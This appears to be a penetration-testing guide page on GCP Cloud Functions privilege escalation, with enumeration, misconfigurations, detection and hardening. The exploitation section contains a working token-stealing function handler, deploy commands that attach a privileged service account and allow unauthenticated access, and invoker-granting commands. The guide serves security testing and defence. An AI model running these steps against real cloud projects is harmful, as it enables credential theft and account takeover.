---
cstg_id: CSTG-GCP-CLOUD-FUNCTIONS-PRIVESC
title: "GCP Cloud Functions - Privilege Escalation"
provider: gcp
service: cloud-functions
phase: privilege-escalation
required_access: assumed-breach
required_permissions: [cloudfunctions.functions.create, cloudfunctions.functions.update, cloudfunctions.functions.sourceCodeSet, cloudfunctions.functions.call, cloudfunctions.functions.invoke, cloudfunctions.functions.setIamPolicy, run.services.create, run.services.update, run.services.setIamPolicy, run.routes.invoke, iam.serviceAccounts.actAs, cloudbuild.builds.create]
tools: [gcloud, curl, gsutil]
references: ["https://cloud.google.com/functions/docs/securing/function-identity", "https://cloud.google.com/iam/docs/service-accounts-actas", "https://cloud.google.com/functions/docs/securing/managing-access-iam", "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/", "https://hackingthe.cloud/gcp/"]
license: CC BY-SA 4.0
---

## Summary

Cloud Functions is one of the richest privilege-escalation surfaces in GCP because a function couples **arbitrary code execution** with an **attached service account identity**. Whoever can deploy, modify, or invoke a function can — directly or indirectly — obtain the credentials of the service account that function runs as. When that service account is more privileged than the calling principal (the common case, since the default compute service account historically holds `roles/editor`), deploying or modifying a function is a privilege escalation.

This page enumerates the distinct permissions that each enable an escalation path, following the structure of one subsection per permission. The unifying primitive is **`iam.serviceAccounts.actAs`**: GCP requires the deploying principal to hold `actAs` on the runtime service account, so most paths combine a deploy/update permission with `actAs` on a target identity. Where `actAs` is held on a privileged account, the deploy permission becomes the escalation. Related primitives appear in [Cloud Run privesc](./gcp-cloud-run-privesc.md) (2nd gen functions share the Cloud Run control plane) and [service account impersonation](./gcp-service-account-impersonation.md).

## Prerequisites

Assumed-breach: the tester holds a principal (user, service account, or workload identity) with one or more of the deploy/update/invoke/setIamPolicy permissions listed below, and—critically—`iam.serviceAccounts.actAs` on at least one service account that is more privileged than the current principal. To discover candidate target identities, first run the [enumeration page](../02-services/gcp-cloud-functions-enum.md) and list service accounts the principal can act as:

```bash
# Which SAs can the current principal actAs? (check predefined roles / bindings)
gcloud iam service-accounts list --project "$PROJECT"
gcloud projects get-iam-policy "$PROJECT" --format=json | \
  jq '.bindings[] | select(.role|test("iam.serviceAccountUser|editor|owner|tokenCreator"))'
```

## Enumeration

Identify the highest-privilege service account the principal can attach to a function, and identify any function whose IAM policy or source the principal can change:

```bash
# Existing functions and their runtime identities
gcloud functions list --project "$PROJECT" --format="table(name,serviceConfig.serviceAccountEmail,state)"

# The default compute SA — frequently roles/editor and frequently actAs-able
PROJ_NUM=$(gcloud projects describe "$PROJECT" --format="value(projectNumber)")
echo "${PROJ_NUM}-compute@developer.gserviceaccount.com"
```

## Misconfigurations & Findings

- A principal with a function-deploy permission **plus `actAs` on a privileged service account** (especially the default compute SA / `roles/editor`).
- `roles/cloudfunctions.developer` or `roles/run.developer` granted to a low-trust principal — these include create/update of functions.
- `cloudfunctions.functions.setIamPolicy` / `run.services.setIamPolicy` held by a principal who is not otherwise an admin — allows self-granting the invoker role or exposing a function publicly.
- Existing functions running privileged identities whose **source** or **environment** the principal can modify.
- `actAs` granted at the project level via `roles/iam.serviceAccountUser` (grants actAs on *all* SAs in the project).

## Exploitation

### `iam.serviceAccounts.actAs` (+ a deploy permission)

This is the keystone. `actAs` alone does nothing; combined with any of the deploy permissions below it lets the principal attach a privileged service account to attacker-controlled code. If `actAs` is held on the default compute service account (`roles/editor`), every deploy path becomes full-project escalation. Verify the binding, then proceed to one of the deploy paths.

### `cloudfunctions.functions.create` (1st gen) / `run.services.create` (2nd gen)

Deploy a new function whose runtime service account is the target identity and whose code exfiltrates that identity's token. The function reads its own token from the metadata server and returns or beacons it out.

Malicious handler (`main.py`, Python runtime):

```python
import os, urllib.request, json

def handler(request):
    md = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    req = urllib.request.Request(md, headers={"Metadata-Flavor": "Google"})
    tok = urllib.request.urlopen(req).read().decode()
    # Also grab project + scopes + env for completeness
    return json.dumps({"token": json.loads(tok), "env": dict(os.environ)})
```

Deploy attaching the privileged identity:

```bash
gcloud functions deploy exfil \
  --runtime python312 --trigger-http --allow-unauthenticated \
  --region "$REGION" --project "$PROJECT" --entry-point handler \
  --service-account "$TARGET_SA" --source .
```

Then invoke (see the invoke permissions below) and capture the returned access token. That token can be used directly against any API the target SA is authorized for:

```bash
curl -s -H "Authorization: Bearer $TARGET_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT/getIamPolicy" -X POST
```

### `cloudfunctions.functions.update` / `run.services.update` / `cloudfunctions.functions.sourceCodeSet`

If creating new functions is blocked but the principal can update an existing function that already runs a privileged identity, overwrite its source (or environment variables) with the exfiltration handler above and redeploy. The runtime identity is inherited from the existing function, so `actAs` may not even be re-checked depending on whether the service account is being changed.

```bash
gcloud functions deploy "$EXISTING_FN" --region "$REGION" --project "$PROJECT" --source .
```

Even without changing code, an attacker can add an environment variable that points the application at an attacker-controlled endpoint, or change `--update-secrets` to mount a Secret Manager secret the function's SA can read and have the function echo it back.

### `cloudfunctions.functions.call` / `cloudfunctions.functions.invoke` / `run.routes.invoke`

Invocation permissions complete a deploy path and are also independently useful when an existing privileged function already echoes data or performs sensitive actions. Invoke a function through the control plane (which bypasses the function's own HTTP-level IAM policy for 1st gen `call`):

```bash
# 1st gen control-plane invocation
gcloud functions call exfil --region "$REGION" --project "$PROJECT" --data '{}'

# Direct HTTP invocation (needs run.invoker / cloudfunctions.invoker, or allUsers)
ID_TOKEN=$(gcloud auth print-identity-token)
curl -s -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL"
```

### `cloudfunctions.functions.setIamPolicy` / `run.services.setIamPolicy`

This permission lets the principal grant *themselves* (or `allUsers`) the invoker role on a function, turning a function they cannot currently call into one they can. When paired with an existing privileged function, this opens invocation; paired with a function the attacker has deployed, it makes the exfil endpoint reachable.

```bash
# 2nd gen: self-grant invoker
gcloud run services add-iam-policy-binding "$FN" --region "$REGION" --project "$PROJECT" \
  --member "user:attacker@example.com" --role roles/run.invoker

# 1st gen
gcloud functions add-invoker-policy-binding "$FN" --region "$REGION" --project "$PROJECT" \
  --member "allUsers"
```

### `cloudbuild.builds.create`

2nd gen function deployment (and 1st gen builds) run through Cloud Build, which itself executes with the Cloud Build service account (`PROJECT_NUMBER@cloudbuild.gserviceaccount.com`), historically privileged. A principal who can submit builds can run arbitrary commands as the Cloud Build SA and read its token from the build environment — an escalation independent of the function's own runtime identity. See [Cloud Build privesc](./gcp-cloud-build-privesc.md) for the full path; it is reachable as a side effect of function deployment.

## Detection & Logging

**Cloud Audit Logs** capture every step:

- Admin Activity logs record `google.cloud.functions.v2.FunctionService.CreateFunction` / `UpdateFunction`, the legacy `v1` equivalents, and `google.cloud.run.v2.Services.CreateService`/`UpdateService`. The `protoPayload.request.function.serviceConfig.serviceAccountEmail` shows the attached identity — a deploy that attaches a different/more-privileged SA than the deployer normally uses is a strong signal.
- `SetIamPolicy` entries on functions or Cloud Run services that add `allUsers`, `allAuthenticatedUsers`, or an external member to the invoker role.
- `iam.serviceAccounts.actAs` / `GenerateAccessToken` usage tied to the deploying principal.
- Cloud Build `CreateBuild` events and the build's own audit trail.
- Function invocations appear as Cloud Run request logs / Cloud Functions execution logs; an exfil function typically shows anomalous outbound calls or returns large payloads.

Defenders should alert on: any deploy/update where the attached service account differs from the deployer's normal pattern; any function created with `--allow-unauthenticated`; and any `SetIamPolicy` adding `allUsers`.

## Remediation & Hardening

- **Separate deploy from identity.** Never grant `actAs` on a privileged service account to principals who only need to deploy. Give each function a dedicated, minimally-scoped runtime service account.
- **Stop using the default compute service account** for functions; create per-function least-privilege accounts and disable the default SA's automatic `roles/editor` (org policy `constraints/iam.automaticIamGrantsForDefaultServiceAccounts`).
- Restrict `roles/cloudfunctions.developer`, `roles/run.developer`, and `setIamPolicy` permissions; require these through reviewed CI/CD pipelines, not interactive users.
- Enforce `constraints/iam.allowedPolicyMemberDomains` (Domain Restricted Sharing) to block public invoker bindings.
- Lock down the Cloud Build service account and prefer the default (least-privilege) Cloud Build SA behavior introduced for new projects.
- Use organization-level deny policies on `cloudfunctions.functions.setIamPolicy` and `run.services.setIamPolicy` for non-admin principals.

## Tools

- `gcloud functions` / `gcloud run` — deploy, update, invoke, and IAM binding operations.
- `curl` — metadata token retrieval inside the runtime and direct HTTP invocation.
- `gsutil` — staging or retrieving function source archives.

## References

- Function identity / runtime service accounts — https://cloud.google.com/functions/docs/securing/function-identity
- Acting as service accounts (`actAs`) — https://cloud.google.com/iam/docs/service-accounts-actas
- Managing access with IAM (Cloud Functions) — https://cloud.google.com/functions/docs/securing/managing-access-iam
- Rhino Security Labs — GCP privilege escalation — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- hackingthe.cloud GCP techniques — https://hackingthe.cloud/gcp/
